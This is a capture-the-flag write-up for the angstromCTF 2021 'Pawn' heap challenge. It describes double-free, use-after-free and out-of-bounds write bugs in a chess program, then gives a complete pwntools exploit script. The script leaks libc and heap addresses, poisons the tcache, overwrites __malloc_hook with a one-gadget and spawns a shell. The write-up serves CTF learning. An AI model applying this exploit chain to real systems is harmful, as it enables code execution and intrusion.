Pawn was an interesting challenge from ångstromCTF 2021 Edition.


It was a pwn challenge, in the form of a chess game.


You can allocate up to 5 boards, of 8x8 squares.

You can move the pieces according to the chess rules.

Delete a chessboard.

Print the board current state.

And smite Piece.

It looks like a Heap challenge ..and guess what ?

It was a heap challenge.

Each new board is allocated as 2 bufffers : 

* one of 0x40 bytes (that stores 8 pointers to each line of the board) , 

* a second one of 0x48 bytes that store the board itself in ascii format.
 
So they all fit in the same tcache (0x50 size)

There is a ‘t’ var on bss also, that store the number of moves. It is incremented after each moves. (from any board)

the ‘Smite Piece’ function, is almost a given write primitive, with some restrictions :

It can overwrite a given square on a choosen board, with the content of the var ‘t’.

It just verify that the destination square we write on, is a letter (is_letter() function)

But the function as no range verification for x & y coordinates, 

so you can use it to write outside the board. (on a letter always, the destination will need to pass the is_letter() check)

Also it does not verify if the board has been freed before. (UAF so)

Another important point, when you create a new board.  It is initialized with chessboard normal starting position.  That is stored on .bss in &starting table, as ascii.  
(important for the exploitation later)

The delete Board function, also as a double free vulnerability, it does not check if the choosen board (by index) is already freed.  And does not also clears the pointers in &boards table , so leads to a potential UAF also…


The print Board function also, does not check if the board has already been freed.  So leading to a UAF also , which will help us to leak some pointers (heap & libc)

knowing all that , **we will start our exploitation..**

First we allocate 4 boards (8 blocks)

then we free them to fill the tcache (0x50) entirely.

Then we send a big input to the scanf function , that asks for option.

We send a string of 0x1010 * ‘0’ before the number, to force scanf to call malloc to put our input string, it will make an alloc in unsorted, then free it after the string has been processed.

And it will push a libc address from main_arena in on our previously freed buffer

Now we just have to call print Board function, to get a leak of libc. And calculatre libc base.

We also dump a heap address, from another freed blocks, to calculate heap base address.

Now with our leaks, we will start the exploitation.

We allocate again 4 board (8 consecutive blocks)

Then we free 3 boards, and we keep one board for moving pieces in , and to increment &t to the value we want.

Like that we can write with Smite function the value we want (to a letter)

We set &t to 0xa0,  and with Smite function, overwrite a LSB of a chunk pointer that end by 0x50 (pass the is_letter() check),

to make two next allocation overlap each other.

We then allocate two boards, the second set, will have &boards ascii reprensation, overlap the blocks pointers. Malloc will return two consecutive blocks at the same address so...

Now as the blocks heap pointers are overwritten with pieces ascii value, we can overwrite them with Smite function, as they will pass the is_letter() check.

So we overwrite the next block heap pointer, with address of __malloc_hook, to have the next allocations return a ascii board blocks , on the hook…

but before allocating the blocks, we will overwrite &starting values (that are used to initialize boards ascii values),  with the address of a onegadget in libc.

Then we allocate another new board, the chessboard blocks will be allocated on __malloc_hook,

with the value we put in &starting table…

Now we just have to allocate a new board, to call our onegagdet,

and CheckMate !!

We Got Shell..

P.S.:
*I have to launch the exploit on remote server via ssh, because it was too slow remotely..*

```
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

act = 1

host, port = "shell.actf.co", "21706"
LDPRELOAD = 1
filename = "./pawn"
elf = ELF(filename)

if LDPRELOAD==1:
   libc = ELF('./libc.so.6')
else:
   libc = elf.libc

def getConn():
    if LDPRELOAD == 1:
       return process(filename+'.patched', env={"LD_PRELOAD":libc.path}) if not args.REMOTE else remote(host, port)
    else:
       return process(filename) if not args.REMOTE else remote(host, port)

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    if LDPRELOAD == 1:
       return int(memory_map[1].split("-")[0],16)
    else:
       return int(memory_map[0].split("-")[0],16)

def debug(bp):
    script = "source ~/gdb.plugins/gef/gef.py\n"
    PIE = get_PIE(p)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    script += "c\n"
    gdb.attach(p,gdbscript=script)

p = getConn()
if not args.REMOTE and args.GDB:
	debug([0xeeb])

boards = 0x4040C0
def add(index):
  p.sendlineafter('Delete Board\n', '1')
  p.sendlineafter('index?\n', str(index))

def printb(index):
  p.sendlineafter('Delete Board\n', '2')
  p.sendlineafter('index?\n', str(index))

def delete(index):
  p.sendlineafter('Delete Board\n', '5')
  p.sendlineafter('index?\n', str(index))

def smite(index, x, y):
  p.sendlineafter('Delete Board\n', '4')
  p.sendlineafter('index?\n', str(index))
  p.sendlineafter('spaces.\n', str(x)+' '+str(y))

def move(index, x1, y1, x2, y2):
  p.sendlineafter('Delete Board\n', '3')
  p.sendlineafter('index?\n', str(index))
  p.sendlineafter('spaces.\n', str(x1)+' '+str(y1))
  p.sendlineafter('spaces.\n', str(x2)+' '+str(y2))

# move bishop back and forward to increase t var on .bss (record number of moves)
def inct():
  global act
  if (act & 1):
    # go forward
    move(3, 5, 0, 6, 1)
  else:
    # go back
    move(3, 6, 1, 5, 0)
  act = act + 1
  if (act==256):
   act = 0

# set t (number of moves) by moving piece
def sett(val):
  global act
  if (val==act):
    return
  if (val<act):
    for i in range((0x100 - act)+val):
      inct()
    return
  if (val>act):
    for i in range(val - act):
      inct()
    return

# first we allocate 8 blocs
add(0)
add(1)
add(2)
add(3)
# free them to fill the tcaches
delete(3)
delete(2)
delete(1)
delete(0)

# force allocation in unsorted via a chunk bigger thant stdin buff size 0x1000, will put libc address in chunk0
# to leak a libc address
p.sendlineafter('Delete Board\n', '0'*0x1020+'2\n0\n')
p.recvuntil('-x\n0 ', drop=True)
leak1 = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print('leak1 = {:#x}'.format(leak1))
libc.address = leak1 - 0x1ebc10
print('libc.base = {:#x}'.format(libc.address))

# leak heap address in block 1
printb(1)
p.recvuntil('-x\n0 ', drop=True)
leak2 = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print('leak2 = {:#x}'.format(leak2))

# now we allocate adjacents blocks
add(0)
add(1)
add(2)
add(3)
delete(2)
delete(0)
delete(1)
# move a pawn to init t to 1
move(3, 6, 1, 6, 2)
# set t to 0xa0
sett(0xa0)
# overwrite next block in tcache freed blocs, so that allocating board, will be on an existing bloc of pointers
smite(3, 0x50 ,0)
add(0)
# the second bloc will have his board , allocated at the place of bloc of pointers of another bloc (that we can edit)
add(1)

# prepare our munitions
onegadget = [ 0xe6c7e, 0xe6c81, 0xe6c84]

#dest = libc.symbols['__free_hook']
# finally we will overwrite __malloc_hook
# we will overwrite next free bloc pointer via the board overwriting the bloc of pointers
dest = libc.symbols['__malloc_hook']
for i in range(8):
  sett( (dest>>(i<<3))&0xff)
  smite(3, 0x140+i ,0)
smite(3, 0x140+i ,0)

# put the value to put in __malloc_hook in &starting on bss, so that it will written to the next allocated board
dest =  (0x404020 - (leak2-0x140))
value = libc.address + onegadget[1]
for i in range(8):
  sett( (value>>(i<<3))&0xff)
  smite(3, dest+i ,0)

# allocate bloc on __malloc_hook initialized with data in &starting
add(2)

if args.GDB:
   pause()

# launch a malloc to call the onegadget
add(4)

# we got shell
p.interactive()

```
Nobodyisnobody for RootMeUpBeforeYouGoGo
